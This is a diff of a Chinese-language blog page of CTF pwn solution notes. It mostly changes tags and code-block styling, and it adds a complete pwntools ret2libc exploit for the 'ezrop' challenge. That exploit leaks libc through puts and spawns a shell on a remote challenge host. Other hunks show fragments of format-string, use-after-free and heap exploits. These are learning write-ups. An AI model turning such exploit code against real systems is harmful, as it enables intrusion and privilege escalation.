@@ -5,11 +5,7 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="刷题记录, PWN,linux等">
-    <meta name="description" content="刷题记录[SWPUCTF 2022 新生赛]Integer Overflow一道普通的libc,但是需要注意不能使用elf.sym来寻找system的地址，因为endbr32会保护plt表
-
-所以我们顺着程序逻辑走之后栈溢出即可
-exp:
-">
+    <meta name="description" content="一只菜鸡pwn手的做题记录">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -367,9 +363,13 @@ exp:
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/PWN/">
+                                <span class="chip bg-color">PWN</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
@@ -377,8 +377,8 @@ exp:
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/Markdown/" class="post-category">
-                                Markdown
+                            <a href="/categories/PWN/" class="post-category">
+                                PWN
                             </a>
                         
                     </div>
@@ -423,7 +423,7 @@ exp:
 <p><img src="/2024/02/06/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%5BSWPUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5DInteger%20Overflow.1.png"></p>
 <p>所以我们顺着程序逻辑走之后栈溢出即可</p>
 <p>exp:</p>
-<pre class="line-numbers language-none"><code class="language-none">from pwn import *
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
 
 context(log_level='debug',arch='i386', os='linux')
 
@@ -449,7 +449,7 @@ p.interactive()
 <p>先看代码逻辑，应该是最简单的uaf了，只需要完成四个步骤然后找到<code>NICO</code>即可</p>
 <p><img src="/2024/02/06/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%5BNISACTF%202022%5DUAF.1.png"><br><img src="/2024/02/06/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%5BNISACTF%202022%5DUAF.2.png"><br><img src="/2024/02/06/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%5BNISACTF%202022%5DUAF.3.png"><br><img src="/2024/02/06/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%5BNISACTF%202022%5DUAF4.png"><br><img src="/2024/02/06/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%5BNISACTF%202022%5DUAF.5.png"><br><img src="/2024/02/06/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%5BNISACTF%202022%5DUAF.6.png"></p>
 <p>exp:</p>
-<pre class="line-numbers language-none"><code class="language-none">from pwn import *
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
 
 context(os='linux', arch='i386', log_level='debug')
 
@@ -503,7 +503,7 @@ p.interactive()
 <p><img src="/2024/02/06/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/CISCN%20%E5%8D%8E%E5%8D%97%20PWN4.1.png"></p>
 <p>看到<code>read</code>和<code>printf</code>想到格式化字符串漏洞</p>
 <p>因为是32位程序，用栈传递参数，所以找到esp位置，传入system的地址和/bin/sh后再从栈上退回即可实现提权</p>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h3><pre class="line-numbers language-none"><code class="language-none">from pwn import *
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
 context(os='linux',arch='amd64',log_level='debug')
 p=remote('node5.anna.nssctf.cn',28355)
 
@@ -527,7 +527,7 @@ p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><
 <h2 id="HGAME-2023-week1-simple-shellcode"><a href="#HGAME-2023-week1-simple-shellcode" class="headerlink" title="[HGAME 2023 week1]simple_shellcode"></a>[HGAME 2023 week1]simple_shellcode</h2><p>打开ida可以发现<code>MEMORY[0xCAFE0000]</code>,根据hint调用read来读取flag,而<code>read</code>的范围比较小，手动扩大范围即可</p>
 <p><img src="/2024/02/06/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%5BHGAME%202023%20week1%5Dsimple_shellcode.2.jpg"></p>
 <p>exp:</p>
-<pre class="line-numbers language-none"><code class="language-none">from pwn import *
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
 context(os='linux', arch='amd64', log_level='debug')
 p=remote('node5.anna.nssctf.cn',28430)
 #p=process("./shellcode")
@@ -560,7 +560,7 @@ p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><
 <p><img src="/2024/02/06/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%5BNISACTF%202022%5Dezheap.3.png"></p>
 <p><img src="/2024/02/06/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%5BNISACTF%202022%5Dezheap.4.jpg"></p>
 <p>exp:</p>
-<pre class="line-numbers language-none"><code class="language-none">from pwn import *
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
 
 context(log_level="debug",arch="amd64")
 # p = remote("node4.anna.nssctf.cn",28184)
@@ -576,7 +576,7 @@ p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><
 <h2 id="HNCTF-2022-WEEK4-ezheap"><a href="#HNCTF-2022-WEEK4-ezheap" class="headerlink" title="[HNCTF 2022 WEEK4]ezheap"></a>[HNCTF 2022 WEEK4]ezheap</h2><p>是一道heap的模板题，通过adse几个功能实现对堆上的操作</p>
 <p>因为程序中有puts函数，泄露出函数的偏移和基地址，再去使用libc库中的system函数实现提权，获取shell</p>
 <p>exp:</p>
-<pre class="line-numbers language-none"><code class="language-none">from pwn import *
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
 context(os='linux',arch='amd64',log_level='debug')
 
 #p = process('./pwn')
@@ -652,7 +652,7 @@ p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><
 <p>无法直接传参进入rdi，找个汇编片段间接传参</p>
 <p><img src="/2024/02/06/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/LACTF%20sus.2.png"></p>
 <p>exp:</p>
-<pre class="line-numbers language-none"><code class="language-none">from pwn import *
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
 from LibcSearcher import *
 context(os="linux", arch="amd64", log_level="debug")
 
@@ -734,7 +734,7 @@ p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><
 <p><img src="/2024/02/06/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%5BNISACTF%202022%5DHacknote.3.png"></p>
 <p>content也就是magic函数的地址,覆盖print_note_content函数的指针，成功劫持了程序控制流</p>
 <p>exp:</p>
-<pre class="line-numbers language-none"><code class="language-none">from pwn import *
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
 from LibcSearcher import *
 
 context(os="linux", arch="i386", log_level="debug")
@@ -779,7 +779,7 @@ p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><
 <h2 id="NKCTF-2024-maimai"><a href="#NKCTF-2024-maimai" class="headerlink" title="[NKCTF 2024] maimai"></a>[NKCTF 2024] maimai</h2><p>一道难度中等的栈溢出题目。有两个漏洞，一个是符合分数要求的格式化字符串漏洞来泄露<code>libc</code>和<code>canary</code>，另一个是read函数的栈溢出</p>
 <p>需要注意一下，本地打通之后在远端并不能拿到root权限,只是一个低权限shell，<code>ls -al</code>之后看到pwn程序有s权限，这时候可以找到setuid权限，可以在ROP链中加入setuid(0)即可提权。或者第二种方法orw做题(做出来第二种方法再更)</p>
 <p>exp:</p>
-<pre class="line-numbers language-none"><code class="language-none">
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">
 from pwn import *
 
 context(log_level="debug",arch="amd64")
@@ -832,7 +832,7 @@ p.interactive()
 <p>之后通过一字节的溢出，把libc地址放在指针后面</p>
 <p>memcpy时将payload复制到返回地址位置来实现ROP</p>
 <p>exp:</p>
-<pre class="line-numbers language-none"><code class="language-none">
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">
 from pwn import *
 from sympy.ntheory.modular import crt
 
@@ -880,23 +880,59 @@ print(stdout)
 p.interactive()
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="TUTCTF-pwn-ezrop"><a href="#TUTCTF-pwn-ezrop" class="headerlink" title="TUTCTF pwn ezrop"></a>TUTCTF pwn ezrop</h2><pre class="line-numbers language-checksec```一下，开了nx保护，使用```rop```处理，程序中没有```system```和```/bin/sh```字符串，使用ret2libc,根据泄露出的```puts```函数确定libc库版本，```ROPgadget```找到pop_rdi_ret位置，然后计算偏移，将```system```和```/bin/sh```传入即可" data-language="checksec```一下，开了nx保护，使用```rop```处理，程序中没有```system```和```/bin/sh```字符串，使用ret2libc,根据泄露出的```puts```函数确定libc库版本，```ROPgadget```找到pop_rdi_ret位置，然后计算偏移，将```system```和```/bin/sh```传入即可"><code class="language-checksec```一下，开了nx保护，使用```rop```处理，程序中没有```system```和```/bin/sh```字符串，使用ret2libc,根据泄露出的```puts```函数确定libc库版本，```ROPgadget```找到pop_rdi_ret位置，然后计算偏移，将```system```和```/bin/sh```传入即可"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="TUTCTF-pwn-ezrop"><a href="#TUTCTF-pwn-ezrop" class="headerlink" title="TUTCTF pwn ezrop"></a>TUTCTF pwn ezrop</h2><pre class="line-numbers language-checksec```一下，开了nx保护，使用```rop```处理，程序中没有```system```和```/bin/sh```字符串，使用ret2libc,根据泄露出的```puts```函数确定libc库版本，```ROPgadget```找到pop_rdi_ret位置，然后计算偏移，将```system```和```/bin/sh```传入即可" data-language="checksec```一下，开了nx保护，使用```rop```处理，程序中没有```system```和```/bin/sh```字符串，使用ret2libc,根据泄露出的```puts```函数确定libc库版本，```ROPgadget```找到pop_rdi_ret位置，然后计算偏移，将```system```和```/bin/sh```传入即可"><code class="language-checksec```一下，开了nx保护，使用```rop```处理，程序中没有```system```和```/bin/sh```字符串，使用ret2libc,根据泄露出的```puts```函数确定libc库版本，```ROPgadget```找到pop_rdi_ret位置，然后计算偏移，将```system```和```/bin/sh```传入即可">
+```py
 
-<p>from pwn import *<br>from LibcSearcher import *</p>
-<p>#p = process(‘./pwn’)<br>p = remote(‘36.212.170.17’, 9997)<br>libc = ELF(‘./libc.so.6’)<br>elf = ELF(‘./pwn’)</p>
-<p>padding = 0x98</p>
-<p>puts_plt = elf.plt[‘puts’]<br>puts_got = elf.got[‘puts’]<br>main_addr = 0x4011FC<br>pop_rdi_ret = 0x401183<br>ret = 0x40101a</p>
-<p>payload = b’a’ * padding<br>payload += p64(pop_rdi_ret)<br>payload += p64(puts_got)<br>payload += p64(puts_plt)<br>payload += p64(main_addr)</p>
-<p>p.sendline(payload)</p>
-<p>p.recvline()<br>puts_real = u64(p.recvline()[:-1].ljust(8, b’\x00’))<br>print(hex(puts_real))</p>
-<p>libc_base = puts_real - libc.symbols[‘puts’]<br>system_addr = libc_base + libc.symbols[‘system’]<br>bin_sh_addr = libc_base + next(libc.search(b’/bin/sh’))</p>
-<p>print(hex(libc_base))<br>print(hex(system_addr))<br>print(hex(bin_sh_addr))</p>
-<h1 id="gdb-attach-p"><a href="#gdb-attach-p" class="headerlink" title="gdb.attach(p)"></a>gdb.attach(p)</h1><p>payload2 = b’a’ * padding<br>payload2 += p64(ret)<br>payload2 += p64(pop_rdi_ret)<br>payload2 += p64(bin_sh_addr)<br>payload2 += p64(system_addr)</p>
-<p>p.sendline(payload2)</p>
-<h1 id="sleep-1"><a href="#sleep-1" class="headerlink" title="sleep(1)"></a>sleep(1)</h1><p>p.interactive()</p>
-<pre><code>
-</code></pre>
+from pwn import *
+from LibcSearcher import *
 
+#p = process('./pwn')
+p = remote('36.212.170.17', 9997)
+libc = ELF('./libc.so.6')
+elf = ELF('./pwn')
+
+padding = 0x98
+
+puts_plt = elf.plt['puts']
+puts_got = elf.got['puts']
+main_addr = 0x4011FC
+pop_rdi_ret = 0x401183
+ret = 0x40101a
+
+payload = b'a' * padding
+payload += p64(pop_rdi_ret)
+payload += p64(puts_got)
+payload += p64(puts_plt)
+payload += p64(main_addr)
+
+p.sendline(payload)
+
+p.recvline()
+puts_real = u64(p.recvline()[:-1].ljust(8, b'\x00'))
+print(hex(puts_real))
+
+libc_base = puts_real - libc.symbols['puts']
+system_addr = libc_base + libc.symbols['system']
+bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))
+
+print(hex(libc_base))
+print(hex(system_addr))
+print(hex(bin_sh_addr))
+
+# gdb.attach(p)
+
+payload2 = b'a' * padding
+payload2 += p64(ret)
+payload2 += p64(pop_rdi_ret)
+payload2 += p64(bin_sh_addr)
+payload2 += p64(system_addr)
+
+p.sendline(payload2)
+
+# sleep(1)
+
+p.interactive()
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
                 
             </div>
             <hr/>
@@ -959,7 +995,11 @@ p.interactive()
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/PWN/">
+                                    <span class="chip bg-color">PWN</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -1154,7 +1194,7 @@ gitment.render('gitment-content');
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
+                            第二周周报
                         
                     </div>
                     <div class="publish-info">
@@ -1163,11 +1203,23 @@ gitment.render('gitment-content');
                         </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            J1ton9
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/PWN/" class="post-category">
+                                    PWN
+                                </a>
+                            
                             
                         </span>
                     </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/PWN/">
+                        <span class="chip bg-color">PWN</span>
+                    </a>
+                    
                 </div>
                 
             </div>
@@ -1176,41 +1228,35 @@ gitment.render('gitment-content');
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="far fa-dot-circle"></i>
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2024/02/06/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">
+                <a href="/2018/09/07/hello-world/">
                     <div class="card-image">
                         
+                        <img src="/source/images/xxx.jpg" class="responsive-img" alt="typora-vue-theme主题介绍">
                         
-                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="刷题记录">
-                        
-                        <span class="card-title">刷题记录</span>
+                        <span class="card-title">typora-vue-theme主题介绍</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
+                            这是你自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2024-02-06
+                                <i class="far fa-clock fa-fw icon-date"></i>2018-09-07
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/Markdown/" class="post-category">
-                                    Markdown
-                                </a>
-                            
+                            <i class="fas fa-user fa-fw"></i>
+                            赵奇
                             
                         </span>
                     </div>
                 </div>
-
                 
             </div>
         </div>
